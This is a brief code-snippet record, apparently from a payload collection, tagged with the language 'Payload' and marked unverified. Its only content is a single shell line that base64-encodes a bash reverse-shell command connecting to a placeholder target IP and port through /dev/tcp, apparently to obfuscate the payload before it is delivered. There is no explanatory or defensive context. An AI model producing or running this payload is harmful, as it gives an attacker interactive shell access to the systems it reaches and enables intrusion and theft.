---
id: 85ef1c3b-b5bb-4a52-820f-0a4cec7673e2
type: code
language: Payload
verified: false
created_at: '2020-04-06T18:25:37.791771+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 85ef1c3b

**Language**: Payload

```payload
echo 'bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_PORT 0>&1' | base64 -w 0
```


